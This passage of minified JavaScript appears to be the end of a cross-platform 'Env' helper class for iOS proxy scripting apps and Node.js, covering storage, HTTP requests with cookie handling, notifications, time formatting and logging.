runScript(t, e) { return new Promise((s => { let i = this.getdata("@chavy_boxjs_userCfgs.httpapi"); i = i ? i.replace(/\n/g, "").trim() : i; let o = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout"); o = o ? 1 * o : 20, o = e && e.timeout ? e.timeout : o; const [r, a] = i.split("@"), n = { url: `http://${a}/v1/scripting/evaluate`, body: { script_text: t, mock_type: "cron", timeout: o }, headers: { "X-Key": r, Accept: "*/*" }, timeout: o }; this.post(n, ((t, e, i) => s(i))) })).catch((t => this.logErr(t))) } loaddata() { if (!this.isNode()) return {}; { this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path"); const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile), s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e); if (!s && !i) return {}; { const i = s ? t : e; try { return JSON.parse(this.fs.readFileSync(i)) } catch (t) { return {} } } } } writedata() { if (this.isNode()) { this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path"); const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile), s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e), o = JSON.stringify(this.data); s ? this.fs.writeFileSync(t, o) : i ? this.fs.writeFileSync(e, o) : this.fs.writeFileSync(t, o) } } lodash_get(t, e, s) { const i = e.replace(/\[(\d+)\]/g, ".$1").split("."); let o = t; for (const t of i) if (o = Object(o)[t], void 0 === o) return s; return o } lodash_set(t, e, s) { return Object(t) !== t || (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce(((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}), t)[e[e.length - 1]] = s), t } getdata(t) { let e = this.getval(t); if (/^@/.test(t)) { const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t), o = s ? this.getval(s) : ""; if (o) try { const t = JSON.parse(o); e = t ? this.lodash_get(t, i, "") : e } catch (t) { e = "" } } return e } setdata(t, e) { let s = !1; if (/^@/.test(e)) { const [, i, o] = /^@(.*?)\.(.*?)$/.exec(e), r = this.getval(i), a = i ? "null" === r ? null : r || "{}" : "{}"; try { const e = JSON.parse(a); this.lodash_set(e, o, t), s = this.setval(JSON.stringify(e), i) } catch (e) { const r = {}; this.lodash_set(r, o, t), s = this.setval(JSON.stringify(r), i) } } else s = this.setval(t, e); return s } getval(t) { switch (this.getEnv()) { case "Surge": case "Loon": case "Stash": case "Shadowrocket": return $persistentStore.read(t); case "Quantumult X": return $prefs.valueForKey(t); case "Node.js": return this.data = this.loaddata(), this.data[t]; default: return this.data && this.data[t] || null } } setval(t, e) { switch (this.getEnv()) { case "Surge": case "Loon": case "Stash": case "Shadowrocket": return $persistentStore.write(t, e); case "Quantumult X": return $prefs.setValueForKey(t, e); case "Node.js": return this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0; default: return this.data && this.data[e] || null } } initGotEnv(t) { this.got = this.got ? this.got : require("got"), this.cktough = this.cktough ? this.cktough : require("tough-cookie"), this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar, t && (t.headers = t.headers ? t.headers : {}, t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.cookie && void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar))) } get(t, e = (() => { })) { switch (t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"], delete t.headers["content-type"], delete t.headers["content-length"]), t.params && (t.url += "?" + this.queryStr(t.params)), void 0 === t.followRedirect || t.followRedirect || ((this.isSurge() || this.isLoon()) && (t["auto-redirect"] = !1), this.isQuanX() && (t.opts ? t.opts.redirection = !1 : t.opts = { redirection: !1 })), this.getEnv()) { case "Surge": case "Loon": case "Stash": case "Shadowrocket": default: this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, { "X-Surge-Skip-Scripting": !1 })), $httpClient.get(t, ((t, s, i) => { !t && s && (s.body = i, s.statusCode = s.status ? s.status : s.statusCode, s.status = s.statusCode), e(t, s, i) })); break; case "Quantumult X": this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, { hints: !1 })), $task.fetch(t).then((t => { const { statusCode: s, statusCode: i, headers: o, body: r, bodyBytes: a } = t; e(null, { status: s, statusCode: i, headers: o, body: r, bodyBytes: a }, r, a) }), (t => e(t && t.error || "UndefinedError"))); break; case "Node.js": let s = require("iconv-lite"); this.initGotEnv(t), this.got(t).on("redirect", ((t, e) => { try { if (t.headers["set-cookie"]) { const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString(); s && this.ckjar.setCookieSync(s, null), e.cookieJar = this.ckjar } } catch (t) { this.logErr(t) } })).then((t => { const { statusCode: i, statusCode: o, headers: r, rawBody: a } = t, n = s.decode(a, this.encoding); e(null, { status: i, statusCode: o, headers: r, rawBody: a, body: n }, n) }), (t => { const { message: i, response: o } = t; e(i, o, o && s.decode(o.rawBody, this.encoding)) })); break } } post(t, e = (() => { })) { const s = t.method ? t.method.toLocaleLowerCase() : "post"; switch (t.body && t.headers && !t.headers["Content-Type"] && !t.headers["content-type"] && (t.headers["content-type"] = "application/x-www-form-urlencoded"), t.headers && (delete t.headers["Content-Length"], delete t.headers["content-length"]), void 0 === t.followRedirect || t.followRedirect || ((this.isSurge() || this.isLoon()) && (t["auto-redirect"] = !1), this.isQuanX() && (t.opts ? t.opts.redirection = !1 : t.opts = { redirection: !1 })), this.getEnv()) { case "Surge": case "Loon": case "Stash": case "Shadowrocket": default: this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, { "X-Surge-Skip-Scripting": !1 })), $httpClient[s](t, ((t, s, i) => { !t && s && (s.body = i, s.statusCode = s.status ? s.status : s.statusCode, s.status = s.statusCode), e(t, s, i) })); break; case "Quantumult X": t.method = s, this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, { hints: !1 })), $task.fetch(t).then((t => { const { statusCode: s, statusCode: i, headers: o, body: r, bodyBytes: a } = t; e(null, { status: s, statusCode: i, headers: o, body: r, bodyBytes: a }, r, a) }), (t => e(t && t.error || "UndefinedError"))); break; case "Node.js": let i = require("iconv-lite"); this.initGotEnv(t); const { url: o, ...r } = t; this.got[s](o, r).then((t => { const { statusCode: s, statusCode: o, headers: r, rawBody: a } = t, n = i.decode(a, this.encoding); e(null, { status: s, statusCode: o, headers: r, rawBody: a, body: n }, n) }), (t => { const { message: s, response: o } = t; e(s, o, o && i.decode(o.rawBody, this.encoding)) })); break } } time(t, e = null) { const s = e ? new Date(e) : new Date; let i = { "M+": s.getMonth() + 1, "d+": s.getDate(), "H+": s.getHours(), "m+": s.getMinutes(), "s+": s.getSeconds(), "q+": Math.floor((s.getMonth() + 3) / 3), S: s.getMilliseconds() }; /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length))); for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length))); return t } queryStr(t) { let e = ""; for (const s in t) { let i = t[s]; null != i && "" !== i && ("object" == typeof i && (i = JSON.stringify(i)), e += `${s}=${i}&`) } return e = e.substring(0, e.length - 1), e } msg(e = t, s = "", i = "", o = {}) { const r = t => { const { $open: e, $copy: s, $media: i, $mediaMime: o } = t; switch (typeof t) { case void 0: return t; case "string": switch (this.getEnv()) { case "Surge": case "Stash": default: return { url: t }; case "Loon": case "Shadowrocket": return t; case "Quantumult X": return { "open-url": t }; case "Node.js": return }case "object": switch (this.getEnv()) { case "Surge": case "Stash": case "Shadowrocket": default: { const r = {}; let a = t.openUrl || t.url || t["open-url"] || e; a && Object.assign(r, { action: "open-url", url: a }); let n = t["update-pasteboard"] || t.updatePasteboard || s; if (n && Object.assign(r, { action: "clipboard", text: n }), i) { let t, e, s; if (i.startsWith("http")) t = i; else if (i.startsWith("data:")) { const [t] = i.split(";"), [, o] = i.split(","); e = o, s = t.replace("data:", "") } else { e = i, s = (t => { const e = { JVBERi0: "application/pdf", R0lGODdh: "image/gif", R0lGODlh: "image/gif", iVBORw0KGgo: "image/png", "/9j/": "image/jpg" }; for (var s in e) if (0 === t.indexOf(s)) return e[s]; return null })(i) } Object.assign(r, { "media-url": t, "media-base64": e, "media-base64-mime": o ?? s }) } return Object.assign(r, { "auto-dismiss": t["auto-dismiss"], sound: t.sound }), r } case "Loon": { const s = {}; let o = t.openUrl || t.url || t["open-url"] || e; o && Object.assign(s, { openUrl: o }); let r = t.mediaUrl || t["media-url"]; return i?.startsWith("http") && (r = i), r && Object.assign(s, { mediaUrl: r }), console.log(JSON.stringify(s)), s } case "Quantumult X": { const o = {}; let r = t["open-url"] || t.url || t.openUrl || e; r && Object.assign(o, { "open-url": r }); let a = t["media-url"] || t.mediaUrl; i?.startsWith("http") && (a = i), a && Object.assign(o, { "media-url": a }); let n = t["update-pasteboard"] || t.updatePasteboard || s; return n && Object.assign(o, { "update-pasteboard": n }), console.log(JSON.stringify(o)), o } case "Node.js": return }default: return } }; if (!this.isMute) switch (this.getEnv()) { case "Surge": case "Loon": case "Stash": case "Shadowrocket": default: $notification.post(e, s, i, r(o)); break; case "Quantumult X": $notify(e, s, i, r(o)); break; case "Node.js": break }if (!this.isMuteLog) { let t = ["", "==============📣系统通知📣=============="]; t.push(e), s && t.push(s), i && t.push(i), console.log(t.join("\n")), this.logs = this.logs.concat(t) } } debug(...t) { this.logLevels[this.logLevel] <= this.logLevels.debug && (t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(`${this.logLevelPrefixs.debug}${t.map((t => t ?? String(t))).join(this.logSeparator)}`)) } info(...t) { this.logLevels[this.logLevel] <= this.logLevels.info && (t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(`${this.logLevelPrefixs.info}${t.map((t => t ?? String(t))).join(this.logSeparator)}`)) } warn(...t) { this.logLevels[this.logLevel] <= this.logLevels.warn && (t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(`${this.logLevelPrefixs.warn}${t.map((t => t ?? String(t))).join(this.logSeparator)}`)) } error(...t) { this.logLevels[this.logLevel] <= this.logLevels.error && (t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(`${this.logLevelPrefixs.error}${t.map((t => t ?? String(t))).join(this.logSeparator)}`)) } log(...t) { t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(t.map((t => t ?? String(t))).join(this.logSeparator)) } logErr(t, e) { switch (this.getEnv()) { case "Surge": case "Loon": case "Stash": case "Shadowrocket": case "Quantumult X": default: this.log("", `❗️${this.name}, 错误!`, e, t); break; case "Node.js": this.log("", `❗️${this.name}, 错误!`, e, void 0 !== t.message ? t.message : t, t.stack); break } } wait(t) { return new Promise((e => setTimeout(e, t))) } done(t = {}) { const e = ((new Date).getTime() - this.startTime) / 1e3; switch (this.log("", `🔔${this.name}, 结束! 🕛 ${e} 秒`), this.log(), this.getEnv()) { case "Surge": case "Loon": case "Stash": case "Shadowrocket": case "Quantumult X": default: $done(t); break; case "Node.js": process.exit(1) } } }(t, e) }
